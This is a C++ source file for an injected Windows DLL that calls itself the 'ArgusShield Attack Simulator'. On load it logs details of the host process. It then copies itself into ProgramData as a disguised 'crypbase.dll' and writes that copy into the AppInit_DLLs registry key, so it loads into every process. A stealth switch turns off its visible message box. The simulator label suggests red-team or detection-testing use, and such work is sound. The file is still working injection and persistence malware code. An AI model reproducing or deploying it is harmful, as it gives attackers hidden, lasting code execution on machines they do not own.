// pch.h MUST be the first include when using precompiled headers
#include "pch.h"

#include <Windows.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <sstream>
#include <ShlObj.h>
#include <TlHelp32.h>

#pragma comment(lib, "shell32.lib")

// Log file path - consistent with Injector.exe
#define ARGUSSHIELD_LOG_FILE "C:\\ArgusShield_injection_proof.txt"
#define ARGUSSHIELD_DLL_LOG "C:\\ArgusShield_dll_activity.txt"

// Stealth mode - set to true to disable MessageBox (silent operation)
#define STEALTH_MODE false

// Forward declarations for persistence
void LogDLLActivity(const std::string& message);
bool EstablishDLLPersistence(HMODULE hModule);
bool HookAPIForPersistence();
void MaintainProcessStability();

// Get current timestamp as string
std::string GetTimestamp()
{
    time_t now = time(0);
    struct tm timeinfo;
    localtime_s(&timeinfo, &now);
    char buffer[80];
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &timeinfo);
    return std::string(buffer);
}

// Get the module name of the host process
std::string GetHostProcessName()
{
    char processPath[MAX_PATH];
    GetModuleFileNameA(NULL, processPath, MAX_PATH);
    std::string path(processPath);
    size_t pos = path.find_last_of("\\");
    return (pos != std::string::npos) ? path.substr(pos + 1) : path;
}

// DLL Entry Point - Called when DLL is loaded
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        // Disable thread library calls for optimization and stealth
        DisableThreadLibraryCalls(hModule);

        // Wrap in try-catch for process stability
        try
        {
            // Gather injection information
            DWORD processId = GetCurrentProcessId();
            DWORD threadId = GetCurrentThreadId();
            std::string processName = GetHostProcessName();
            std::string timestamp = GetTimestamp();

            // Get DLL path
            char dllPath[MAX_PATH];
            GetModuleFileNameA(hModule, dllPath, MAX_PATH);

            // Log activity (silent)
            LogDLLActivity("============================================");
            LogDLLActivity("DLL_PROCESS_ATTACH - Injection Activated");
            LogDLLActivity("Process: " + processName + " (PID: " + std::to_string(processId) + ")");
            LogDLLActivity("DLL Path: " + std::string(dllPath));
            LogDLLActivity("============================================");

            // Create detailed proof file
            std::ofstream logFile(ARGUSSHIELD_LOG_FILE);
            if (logFile.is_open())
            {
                logFile << "============================================================" << std::endl;
                logFile << "  ArgusShield Attack Simulator - Injection Proof" << std::endl;
                logFile << "============================================================" << std::endl;
                logFile << std::endl;
                logFile << "[+] INJECTION SUCCESSFUL!" << std::endl;
                logFile << std::endl;
                logFile << "[*] Attack Details:" << std::endl;
                logFile << "    Technique: LoadLibrary DLL Injection" << std::endl;
                logFile << "    MITRE ATT&CK: T1055.001" << std::endl;
                logFile << std::endl;
                logFile << "[*] Target Process Information:" << std::endl;
                logFile << "    Process Name: " << processName << std::endl;
                logFile << "    Process ID (PID): " << processId << std::endl;
                logFile << "    Thread ID (TID): " << threadId << std::endl;
                logFile << std::endl;
                logFile << "[*] Injected DLL Information:" << std::endl;
                logFile << "    DLL Path: " << dllPath << std::endl;
                logFile << "    Base Address: 0x" << std::hex << (DWORD_PTR)hModule << std::dec << std::endl;
                logFile << std::endl;
                logFile << "[*] Persistence Status:" << std::endl;
                logFile << "    Persistence mechanisms active from installer" << std::endl;
                logFile << std::endl;
                logFile << "[*] Timestamp: " << timestamp << std::endl;
                logFile << std::endl;
                logFile << "============================================================" << std::endl;
                logFile.close();
            }

            // Establish DLL-level persistence (registry for DLL loading)
            LogDLLActivity("Establishing DLL persistence...");
            EstablishDLLPersistence(hModule);

            // Stealth mode check - only show MessageBox if not in stealth mode
            if (!STEALTH_MODE)
            {
                // Build message for MessageBox
                std::stringstream msg;
                msg << "ArgusShield: LoadLibrary DLL Injection Successful!\n\n";
                msg << "Target Process: " << processName << "\n";
                msg << "Process ID: " << processId << "\n";
                msg << "\nLog saved to: " << ARGUSSHIELD_LOG_FILE;

                // Show message box for visual confirmation (demo mode)
                MessageBoxA(NULL, msg.str().c_str(), "ArgusShield Attack Simulator", MB_OK | MB_ICONWARNING);
            }

            LogDLLActivity("DLL initialization completed successfully");
        }
        catch (...)
        {
            // Silent failure - maintain process stability
            // Never crash the host process
            LogDLLActivity("[ERROR] Exception during DLL_PROCESS_ATTACH - handled gracefully");
        }

        break;
    }
    case DLL_PROCESS_DETACH:
    {
        // Clean detach - maintain process stability
        try
        {
            LogDLLActivity("DLL_PROCESS_DETACH - Unloading gracefully");
        }
        catch (...)
        {
            // Silent
        }
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        // Disabled via DisableThreadLibraryCalls for efficiency
        break;
    }
    return TRUE;
}

// ============================================================
// PERSISTENCE AND STEALTH FUNCTIONS
// ============================================================

// Silent logging for DLL activity
void LogDLLActivity(const std::string& message)
{
    try
    {
        std::ofstream logFile(ARGUSSHIELD_DLL_LOG, std::ios::app);
        if (logFile.is_open())
        {
            SYSTEMTIME st;
            GetLocalTime(&st);
            
            char timestamp[64];
            sprintf_s(timestamp, "[%04d-%02d-%02d %02d:%02d:%02d] ",
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
            
            logFile << timestamp << message << std::endl;
            logFile.close();
        }
    }
    catch (...)
    {
        // Silent failure
    }
}

// Establish DLL-level persistence via AppInit_DLLs or Known DLLs
bool EstablishDLLPersistence(HMODULE hModule)
{
    try
    {
        // Method: Copy DLL to persistent location and register
        char dllPath[MAX_PATH];
        GetModuleFileNameA(hModule, dllPath, MAX_PATH);
        
        // Get ProgramData path for persistence
        char programData[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programData)))
        {
            std::string persistentDir = std::string(programData) + "\\Microsoft\\Crypto\\";
            CreateDirectoryA(persistentDir.c_str(), NULL);
            
            std::string persistentPath = persistentDir + "crypbase.dll";
            
            // Copy DLL to persistent location (disguised name)
            if (CopyFileA(dllPath, persistentPath.c_str(), FALSE))
            {
                LogDLLActivity("[PERSISTENCE] DLL copied to: " + persistentPath);
                
                // Add to AppInit_DLLs registry (requires admin - optional)
                HKEY hKey;
                if (RegOpenKeyExA(
                    HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
                    0,
                    KEY_SET_VALUE,
                    &hKey) == ERROR_SUCCESS)
                {
                    // Enable AppInit_DLLs
                    DWORD loadAppInit = 1;
                    RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, 
                        (BYTE*)&loadAppInit, sizeof(loadAppInit));
                    
                    // Set DLL path
                    RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ,
                        (BYTE*)persistentPath.c_str(), (DWORD)persistentPath.length() + 1);
                    
                    RegCloseKey(hKey);
                    LogDLLActivity("[PERSISTENCE] AppInit_DLLs registry updated (T1546.010)");
                    return true;
                }
                else
                {
                    LogDLLActivity("[PERSISTENCE] AppInit_DLLs requires admin privileges - skipped");
                }
            }
        }
        
        return false;
    }
    catch (...)
    {
        LogDLLActivity("[PERSISTENCE] Exception - handled gracefully");
        return false;
    }
}